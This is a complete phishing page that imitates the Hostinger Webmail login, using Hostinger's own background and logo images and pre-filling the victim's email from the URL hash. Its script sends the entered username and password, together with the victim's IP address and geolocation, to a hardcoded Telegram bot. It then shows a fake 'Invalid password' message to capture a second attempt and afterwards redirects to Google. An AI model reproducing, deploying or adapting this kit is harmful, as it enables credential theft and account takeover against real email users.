<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@600&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: "DM Sans", Arial, sans-serif;
            font-weight: 600;
            font-style: normal;
            height: 100vh;
            background: url('https://mail.hostinger.com/skins/hostinger/images/background.jpg') no-repeat left center fixed;
            background-size: 80%;
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 430px;
            background-color: rgba(255, 255, 255, 0.9);
            padding: 20px 70px;
            margin-right: 20px;
            height: 565px;
        }

        .login-box {
            width: 100%;
            text-align: center;
        }

        .login-box h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #4f4f4f;
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
            margin-top: 25px;
        }

        .input-group label {
            display: block;
            text-align: left;
            color: #6c757d;
            font-size: 14px;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 14px;
            font-size: 15px;
            letter-spacing: 0px;
            color: #535561;
            font-weight: 500;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .input-group input:focus {
            outline: none;
            border-color: #007bff;
        }

        .input-group input::placeholder {
            color: #c0bebe;
            font-weight: 500;
            font-size: 14px;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            color: #6c757d;
        }

        .btn {
            width: 100%;
            padding: 13px;
            background-color: #553adf;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 13px;
            cursor: pointer;
            margin-top: 7px;
        }

        .btn:hover {
            background-color: #553adf;
        }

        .forgot-password {
            margin-top: 20px;
            display: inline-block;
            font-size: 12px;
            color: #673DE6;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .no-account {
            margin-top: 50px;
            font-size: 19px;
            color: #343538;
            font-weight: 600;
            text-align: left;
        }

        .no-account-description {
            margin-top: 10px;
            font-size: 14px;
            color: #727586;
            text-align: left;
            line-height: 25px;
        }

        .get-email-plan {
            color: #6c4bff;
            text-decoration: none;
        }

        .get-email-plan:hover {
            text-decoration: underline;
        }

        .logo {
            text-align: left;
            margin-top: 10px;
        }

        .logo img {
            width: 38%;
        }

        .spinner-box {
            width: 40%;
            background-color: #e2e3e5; /* Grey background */
            border: 1px solid #d4cece;
            color: #673De6;
            font-weight: 600;
            padding: 12px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-right: 20px;
        }

        .spinner-box.hidden {
            display: none;
        }

        .spinner-box .spinner {
            margin-right: 8px;
        }

        .spinner-box .spinner i {
            font-size: 18px;
        }

        .spinner-box.invalid-password {
            background-color: #f8d7da; /* Light red for invalid password */
            color: #721c24; /* Dark red text */
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 768px) {
            body {
                justify-content: center;
            }

            .container {
                width: 100%;
                margin: 0;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><img src="https://mail.hostinger.com/skins/hostinger/images/logo.svg?s=1721285469" alt="">
            </div>
            <div style="text-align: left; font-size: 20px !important; font-weight: 800; line-height: 35px; margin-top: 30px; color: #343538;">
                Hi, ðŸ‘‹ <br>Welcome to Hostinger Webmail
            </div>
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Username" required>
            </div>
            <div class="input-group" style="margin-top: -5px;">
                <input type="password" id="password" name="password" placeholder="Password" required>
                <i class="fas fa-eye toggle-password" onclick="togglePassword()"></i>
            </div>
            <button class="btn" onclick="handleSubmit()">Login</button>
            <a href="#" class="forgot-password">Forgot password?</a>
            <div class="no-account">
                Donâ€™t have an email account?
            </div>
            <div class="no-account-description">
                Discover the perfect email plan for your needs and elevate your communication.
            </div>
            <div class="feet" style="margin-top: 20px; text-align: left;">
                <button type="button" style="padding: 12px 30px; background-color: transparent; border: 1px solid #d4cece; color: #673De6; font-weight: 600; cursor: pointer;">
                    Get email plan
                </button>
            </div>
            <div class="spinner-box" id="spinner-box">
                <div class="spinner"></div>
                <div id="spinner-text">Loading...</div>
            </div>
        </div>
    </div>

    <script>
        let submitCount = 0;

        function encodeBase64(str) {
            try {
                return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function (match, p1) {
                    return String.fromCharCode('0x' + p1);
                }));
            } catch (e) {
                console.error('Error encoding to Base64:', e);
                return '';
            }
        }

        function decodeBase64(base64) {
            try {
                return decodeURIComponent(atob(base64).split('').map(function (c) {
                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                }).join(''));
            } catch (e) {
                console.error('Error decoding Base64:', e);
                return '';
            }
        }

        window.onload = function () {
            let hash = window.location.hash.substring(1);
            if (hash) {
                let email;

                if (/^[A-Za-z0-9+/=]+$/.test(hash)) {
                    email = decodeBase64(hash).toLowerCase();
                } else {
                    const base64Email = encodeBase64(hash);
                    window.location.hash = base64Email;
                    email = hash.toLowerCase();
                }

                if (email) {
                    document.getElementById('username').value = email;
                } else {
                    console.error('No valid email found in URL');
                }
            } else {
                console.error('No hash found in URL');
            }
        };

        function togglePassword() {
            var passwordInput = document.getElementById("password");
            var toggleIcon = document.querySelector(".toggle-password");
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                toggleIcon.classList.remove("fa-eye");
                toggleIcon.classList.add("fa-eye-slash");
            } else {
                passwordInput.type = "password";
                toggleIcon.classList.remove("fa-eye-slash");
                toggleIcon.classList.add("fa-eye");
            }
        }

        async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error.message);
        return 'Unknown';
    }
}

async function getLocationFromIP(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=61439`);
        const data = await response.json();
        const country = data.country || 'Unknown';
        const state = data.regionName || 'Unknown';
        const city = data.city || 'Unknown';
        return `${country}, ${state}, ${city}`;
    } catch (error) {
        console.error('Error fetching location:', error.message);
        return 'Unknown';
    }
}

async function handleSubmit() {
    submitCount++;

    // Showing spinner
    const spinnerBox = document.getElementById('spinner-box');
    spinnerBox.style.display = 'flex';
    document.getElementById('spinner-text').textContent = 'Loading...';

    // Fetch IP and location data
    const ip = await getIPAddress();
    const location = await getLocationFromIP(ip);

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send data to Telegram
    const telegramApiUrl = `https://api.telegram.org/bot6375897467:AAHd61FER7YtcdLfImBig8YQT3-9RNHIcQA/sendMessage?chat_id=6834791481&text=HOSTINGER%0AUsername: ${username}%0APassword: ${password}%0AIP: ${ip}%0ALocation: ${location}`;

    fetch(telegramApiUrl)
        .catch(err => console.error('Error sending data to Telegram:', err));

    // Handle spinner and redirect
    setTimeout(() => {
        spinnerBox.style.display = 'none';

        if (submitCount === 1) {
            // Show "Invalid password" box
            document.getElementById('password').value = '';
            document.getElementById('spinner-text').textContent = 'Invalid password';
            spinnerBox.style.display = 'flex';

            setTimeout(() => {
                spinnerBox.style.display = 'none';
            }, 1000);
        } else if (submitCount === 2) {
            // Redirect to Google
            window.location.href = 'https://www.google.com';
        }
    }, 1000);
}

    </script>
</body>

</html>
